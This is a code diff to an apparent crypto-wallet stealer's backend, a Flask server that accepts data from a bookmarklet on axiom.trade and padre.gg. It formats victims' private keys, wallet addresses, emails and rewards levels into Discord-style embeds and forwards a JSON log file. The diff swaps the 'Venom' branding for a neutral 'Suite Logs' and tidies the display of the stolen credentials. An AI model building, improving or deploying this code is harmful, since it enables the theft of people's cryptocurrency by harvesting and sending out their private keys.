@@ -6,6 +6,7 @@ import os
 import base64
 import json
 import time
+from collections import Counter
 from datetime import datetime, timezone
 
 from dotenv import load_dotenv
@@ -29,6 +30,11 @@ PLATFORM_REDIRECTS = {
 }
 
 ALLOWED_HOSTS = ("axiom.trade", "padre.gg")
+
+BRAND       = "Suite Logs"
+BRAND_COLOR = 0xF4F4F5   # neutral light
+OVERVIEW_COLOR = 0xFAFAFA
+WALLET_COLOR   = 0xA1A1AA
 
 
 def decode_b64url(s: str) -> str:
@@ -57,11 +63,7 @@ def done_page(parsed: dict) -> str:
 
 
 def normalize_wallets(parsed: dict) -> list:
-    """Return a wallet list aligned with keys[].
-
-    padre old bookmarklet pushes into keys/addresses but never into wallets.
-    Synthesize stubs so the embed still renders one card per recovered key.
-    """
+    """Return a wallet list aligned with keys[]."""
     platform = (parsed.get("platform") or "").lower()
     wallets = parsed.get("wallets") or []
     keys = parsed.get("keys") or []
@@ -82,28 +84,54 @@ def normalize_wallets(parsed: dict) -> list:
     return stubs
 
 
+def chain_breakdown(wallets: list) -> str:
+    counts = Counter()
+    for w in wallets:
+        if not isinstance(w, (list, tuple)) or len(w) < 2:
+            continue
+        chain = (w[1] or "?").upper() or "?"
+        counts[chain] += 1
+    if not counts:
+        return "—"
+    return " · ".join(f"{c}: {n}" for c, n in counts.most_common())
+
+
+def trunc(s: str, n: int) -> str:
+    s = s or ""
+    return s if len(s) <= n else s[: n - 1] + "…"
+
+
+def short_addr(addr: str) -> str:
+    a = addr or ""
+    if len(a) <= 14:
+        return a or "—"
+    return f"{a[:6]}…{a[-4:]}"
+
+
 def build_embeds(parsed: dict) -> list:
     platform = parsed.get("platform", "?")
-    host = parsed.get("host", "?")
-    keys = parsed.get("keys", []) or []
-    wallets = normalize_wallets(parsed)
-    user = parsed.get("user") or {}
-    email = user.get("email") or "—"
-    rewards = user.get("rewardsLevel", "—")
+    host     = parsed.get("host", "?")
+    keys     = parsed.get("keys", []) or []
+    wallets  = normalize_wallets(parsed)
+    user     = parsed.get("user") or {}
+    email    = user.get("email") or "—"
+    rewards  = user.get("rewardsLevel", "—")
 
     overview = {
-        "title": f"Venom • {host}",
-        "color": 0x22C55E,
+        "author": {"name": BRAND},
+        "title":  f"`{host}` — {len(keys)} key{'s' if len(keys) != 1 else ''} recovered",
+        "color":  OVERVIEW_COLOR,
         "timestamp": datetime.now(timezone.utc).isoformat(),
         "fields": [
             {"name": "Platform", "value": f"`{platform}`", "inline": True},
+            {"name": "Host",     "value": f"`{host}`", "inline": True},
+            {"name": "Rewards",  "value": f"`{rewards}`", "inline": True},
+            {"name": "Email",    "value": f"`{trunc(email, 60)}`", "inline": False},
             {"name": "Keys",     "value": f"`{len(keys)}`", "inline": True},
             {"name": "Wallets",  "value": f"`{len(wallets)}`", "inline": True},
-            {"name": "Email",    "value": f"`{email}`", "inline": True},
-            {"name": "Rewards",  "value": f"`{rewards}`", "inline": True},
-            {"name": "Host",     "value": f"`{host}`", "inline": True},
+            {"name": "Chains",   "value": f"`{chain_breakdown(wallets)}`", "inline": True},
         ],
-        "footer": {"text": "Venom Filters v2.7.0"},
+        "footer": {"text": f"{BRAND} · v3"},
     }
 
     embeds = [overview]
@@ -113,29 +141,42 @@ def build_embeds(parsed: dict) -> list:
         if not isinstance(w, (list, tuple)) or len(w) < 2:
             continue
         addr  = w[0] or ""
-        chain = (w[1] or "").upper()
+        chain = (w[1] or "").upper() or "UNKNOWN"
         label = w[5] if len(w) > 5 else ""
         deriv = w[6] if len(w) > 6 else ""
         key   = keys[i] if i < len(keys) else None
 
-        fields = [{"name": "Address", "value": f"```{addr or '—'}```", "inline": False}]
-        if deriv:
-            fields.append({"name": "Derivation", "value": f"`{deriv}`", "inline": True})
+        title_bits = [f"Wallet {i+1}", chain]
         if label:
-            fields.append({"name": "Label", "value": f"`{label}`", "inline": True})
+            title_bits.append(trunc(label, 24))
+
+        fields = [
+            {"name": "Address", "value": f"```{addr or '—'}```", "inline": False},
+        ]
+        meta = []
+        if deriv:
+            meta.append(f"`{deriv}`")
+        if label:
+            meta.append(f"`{trunc(label, 40)}`")
+        if meta:
+            fields.append({"name": "Path · Label", "value": " · ".join(meta), "inline": False})
+
         if key:
             fields.append({"name": "Private Key", "value": f"```{key}```", "inline": False})
+        else:
+            fields.append({"name": "Private Key", "value": "`not recovered`", "inline": False})
 
         embeds.append({
-            "title": f"Wallet {i+1} — {chain or 'UNKNOWN'}",
-            "color": 0x16A34A,
+            "title": " — ".join(title_bits),
+            "color": WALLET_COLOR,
             "fields": fields,
+            "footer": {"text": f"{chain} · {short_addr(addr)}"},
         })
 
     if len(wallets) > 9:
         overview["fields"].append({
             "name": "Note",
-            "value": f"+{len(wallets)-9} wallets dans le fichier joint",
+            "value": f"`+{len(wallets) - 9}` wallets in attached JSON",
             "inline": False,
         })
 
@@ -145,7 +186,7 @@ def build_embeds(parsed: dict) -> list:
 def forward(parsed: dict, payload: str) -> Response:
     files = {
         "files[0]": (
-            f"venom-{int(time.time()*1000)}.json",
+            f"suite-logs-{int(time.time()*1000)}.json",
             payload.encode("utf-8"),
             "application/json",
         )
@@ -200,5 +241,5 @@ def post_root():
 
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
+    port = int(os.environ.get("PORT", 1000))
     app.run(host="0.0.0.0", port=port)
